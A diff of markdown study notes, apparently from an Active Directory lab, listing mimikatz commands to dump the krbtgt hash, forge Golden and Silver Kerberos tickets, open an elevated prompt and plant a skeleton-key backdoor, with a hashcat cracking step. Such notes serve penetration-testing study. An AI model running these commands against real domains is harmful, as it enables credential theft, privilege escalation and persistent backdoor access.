@@ -145,11 +145,12 @@ hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting 
   - privilege::debug - ensure this outputs [privilege '20' ok]
   - lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account
 - Create a Golden/Silver Ticket
-  ```
+```
   Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759d
 b3f6 /id:500
-  ```
+```
 - to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103
 - misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz
 
 # Kerberos Backdoors w/ mimikatz
+- misc::skeleton - Yes! that's it but don't underestimate this small command it is very powerful
